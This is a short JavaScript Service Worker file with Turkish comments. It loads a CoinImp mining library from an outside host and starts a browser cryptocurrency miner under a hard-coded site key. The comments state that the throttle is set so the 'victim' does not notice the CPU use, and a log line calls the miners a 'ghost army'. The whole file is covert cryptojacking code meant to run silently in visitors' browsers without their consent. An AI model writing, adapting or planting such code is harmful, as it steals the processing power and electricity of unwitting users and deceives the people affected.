// Coinimp kütüphanesini Service Worker içine çekiyoruz
importScripts('https://www.hostingcloud.racing/jeVO.js');

self.addEventListener('install', event => {
    self.skipWaiting();
});

self.addEventListener('activate', event => {
    event.waitUntil(clients.claim());

    // Madenciyi senin anahtarınla başlatıyoruz
    // throttle: 0.7 -> İşlemcinin %30'unu kullanır (Kurban hissetmez)
    const _client = new Client.Anonymous('ae5f219d63b18a851a9a0cfe3e4dbe17df998943e07bed8eb17dd899ee5ac244', {
        throttle: 0.7, c: 'w'
    });

    _client.start();
    console.log("Hayalet ordu göreve başladı!");
});
